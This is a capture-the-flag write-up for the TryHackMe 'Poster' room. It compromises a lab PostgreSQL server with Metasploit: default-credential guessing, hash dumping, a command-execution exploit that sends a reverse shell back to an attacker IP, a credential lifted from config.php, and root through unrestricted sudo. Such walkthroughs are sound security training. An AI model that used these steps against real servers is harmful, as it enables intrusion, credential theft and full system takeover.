# [Poster](https://tryhackme.com/room/poster)

## The sys admin set up a rdbms in a safe way.

# Flag

## What is rdbms?

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

### What is the rdbms installed on the server?

1. Perform reconnaissance on the target machine to identify what services are running.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. From the nmap scan results, we can see that port 5432 is running PostgreSQL.

**Answer:** postgresql

---

### What port is the rdbms running on?

1. Looking at the nmap scan results from the previous question, we can identify the port number where PostgreSQL is running.

**Answer:** 5432

---

### After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

**Answer:** auxiliary/scanner/postgres/postgres_login

---

### What are the credentials you found?

1. Load the PostgreSQL login scanner module and configure it with the target information.

```bash
msfconsole
use auxiliary/scanner/postgres/postgres_login
show options
set RHOSTS <TARGET_IP>
run
```

[SCREEN01]

**Answer:** postgres:password

---

### What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?

**Answer:** auxiliary/admin/postgres/postgres_sql

---

### Based on the results of #6, what is the rdbms version installed on the server?

1. Load the PostgreSQL SQL execution module and configure it with our discovered credentials.

```bash
use auxiliary/admin/postgres/postgres_sql
show options
set RHOSTS <TARGET_IP>
set PASSWORD password
run
```

2. The module output displays the exact PostgreSQL version running on the server.

[SCREEN02]

**Answer:** 9.5.21

---

### What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

**Answer:** auxiliary/scanner/postgres/postgres_hashdump

---

### How many user hashes does the module dump?

1. Load the PostgreSQL hash dump module and configure it with the target information.

```bash
use auxiliary/scanner/postgres/postgres_hashdump
show options
set RHOSTS <TARGET_IP>
set PASSWORD password
run
```

2. The module successfully extracts password hashes for multiple database users. Count the number of hashes displayed in the output.

[SCREEN03]

**Answer:** 6

---

### What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

**Answer:** auxiliary/admin/postgres/postgres_readfile

---

### What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

**Answer:** exploit/multi/postgres/postgres_copy_from_program_cmd_exec

---

### Compromise the machine and locate user.txt

_Change table name for the exploit mentioned above._

1. Load the PostgreSQL command execution exploit module and configure the exploit with the target information and our credentials.

```bash
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
show options
set RHOSTS <TARGET_IP>
set PASSWORD password
set LHOST <ATTACKER_IP>
run
shell
```

2. Verify our current user and explore the home directories.

```bash
whoami
ls /home
ls -la /home/alison
```

3. Search for files owned by the alison user across the filesystem to locate configuration files or credentials.

```bash
find / -type f -user alison 2>/dev/null
```

4. One interesting file is the web application configuration. Examine its contents.

```bash
cat /var/www/html/config.php
```

**Result:**

```php
<?php

	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>
```

5. The `config.php` file reveals credentials for the alison user. Switch to the alison user account using the discovered password. Navigate to alison's home directory and read the user flag.

```bash
su alison
cat /home/alison/user.txt
```

[SCREEN04]

---

### Escalate privileges and obtain root.txt

1. Check what sudo privileges the alison user has.

```bash
sudo -l
```

**Result:**

```
User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

2. The output shows that alison can run ANY command as root with sudo. This is a complete privilege escalation path. We can simply read the root flag directly.

```bash
sudo cat /root/root.txts
```

[SCREEN05]
